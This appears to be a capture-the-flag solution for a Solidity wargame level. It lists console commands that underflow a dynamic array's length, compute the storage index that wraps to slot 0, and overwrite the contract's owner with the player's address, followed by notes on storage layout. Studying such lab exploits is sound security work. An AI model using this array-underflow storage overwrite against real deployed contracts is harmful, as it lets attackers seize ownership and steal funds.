Solution:

Line to get through modifiers:
await contract.make_contact()

Line to cause underflow, make codex.length == 2^256-1:
await contract.retract()

Line takes keccak(1)
p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]))

Line gets index of codex array at contract storage slot 0:
i = BigInt(2 ** 256) - BigInt(p)

Line adds padding to turn 20 bytes into 32 bytes:
address_value = '0x' + '0'.repeat(24) + player.slice(2)

Overwrite contract storage slot 0:
await contract.revise(i, address_value)


OTHER NOTES:
* 2^256-1 = number of slots in array AND number of storage slots in a contract.
* owner variable inherited from parent, stored in slot 0. 20 bytes.  So contact
variable 1 byte fits in slot 0 too. (21 < 32 bytes).
* Dynamic Arrays: Contracts storage slot contains the arrays.length, and
the array's first value array[0] is stored in contract's position keccak(1).
So in 2^256-1 storage slots, 2^256 will overflow to slot 0.  But, we also
subtract out keccak(1), which is where the first value started.